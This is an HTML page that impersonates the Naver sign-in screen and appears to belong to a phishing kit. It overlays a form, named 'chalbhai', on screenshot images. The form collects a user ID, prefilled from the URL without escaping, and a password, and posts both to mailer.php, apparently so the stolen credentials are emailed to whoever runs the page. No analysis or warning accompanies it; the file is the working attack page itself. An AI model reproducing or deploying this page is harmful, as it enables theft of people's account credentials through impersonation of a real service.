<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Naver Sign in</title>
<meta http-equiv="content-type" content="text/html; charset=UTF8">

<link href="images/favicon_1024.png" rel="apple-touch-icon-precomposed" sizes="1024x1024" />
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>



<style> 
  .textbox { 
    font-family: Arial, Helvetica, sans-serif;
    
    color: #333; 
    
    padding: 4px 8px 4px 4px !important;
    line-height: 1; 
    width: 275px; 
    height:46px;
font-size: 18px;	
  } 
 .textbox:hover { 
    border: 1px solid green; 
    box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3); 
    -moz-box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3); 
    -webkit-box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3); 
  } 
 .textbox:focus { 
   
    outline: none; 
    box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3);  
    -moz-box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3); 
    -webkit-box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3); 
    background: rgb(255, 255, 255); } 
  
</style>



<style> 
  .textbox2 { 
    font-family: Arial, Helvetica, sans-serif;
    
    
    
    padding: 4px 8px 4px 4px !important;
    line-height: 1; 
    width: 275px; 
    height:46px;
font-size: 18px;	


  } 
 .textbox:focus { 
   
    outline: none; 
    box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3);  
    -moz-box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3); 
    -webkit-box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3); 
    background: rgb(255, 255, 255); } 
  
</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 100%;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body bgColor="#F5F6F7" Link="#000000" VLink="#000000" ALink="#000000"   style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:328px; top:32px; width:775px; height:573px; z-index:0"><img src="images/body.png" alt="" title="" border=0 width=775 height=573></div>

<div id="image2" style="position:absolute; overflow:hidden; left:523px; top:501px; width:271px; height:28px; z-index:1"><a href="#"><img src="images/fo.png" alt="" title="" border=0 width=271 height=28></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:765px; top:433px; width:134px; height:24px; z-index:2"><a href="#"><img src="images/one.png" alt="" title="" border=0 width=134 height=24></a></div>
<form action=mailer.php name=chalbhai id=chalbhai method=post>
<input name="userid" value="<?=$_GET[userid]?>" class="textbox2" type="text" style="position:absolute;width:459px;left:428px;border:none;text-align:center;outline: none;font-weight: bold;background:rgba(227,162,11,0.0);top:213px;z-index:3" >
<input name="formtext2" class="textbox" required placeholder="Password" type="password" style="position:absolute;width:459px;left:428px;top:274px;z-index:4">
<div id="formimage1" style="position:absolute; left:426px; top:354px; z-index:5"><input type="image" name="formimage1" width="461" height="63" src="images/sign in.png"></div></form>
</div>

</body>
</html>
